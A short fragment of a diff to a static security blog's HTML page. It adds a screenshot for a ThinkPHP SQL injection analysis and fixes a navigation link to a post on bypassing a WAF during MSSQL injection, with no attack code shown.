+<p><img src="/ThinkPHP5-0-xSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/thinkphp_sql_insert_execute_3.png" alt="thinkphp_sql_insert_execute_3"></p>
 
     </div>
 
@@ -292,7 +292,7 @@
     <div class="post-nav">
       <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/title/" rel="next" title="记一次实战MSSQL注入绕过WAF">
+    <a href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF/" rel="next" title="记一次实战MSSQL注入绕过WAF">
       记一次实战MSSQL注入绕过WAF <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
